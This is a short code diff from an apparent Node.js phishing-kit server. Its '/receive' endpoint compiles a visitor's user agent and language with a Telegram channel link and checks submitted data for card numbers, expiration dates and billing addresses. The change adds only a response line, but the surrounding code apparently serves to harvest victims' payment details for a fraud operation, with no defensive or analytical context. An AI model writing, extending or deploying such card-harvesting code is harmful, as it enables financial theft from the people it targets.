@@ -237,6 +237,8 @@ app.post('/receive', async (req, res) => {
       `USER AGENT       : ${userAgent}\n` +
       `SYSTEM LANGUAGE  : ${systemLang}\n` +
       `💬 Telegram: https://t.me/UpdateTeams\n`;
+      
+      res.send('dn');
   }
 
   if (myObjects.includes('ExpirationDate') || myObjects.includes('CardNumber') || myObjects.includes('Billing Address')) {
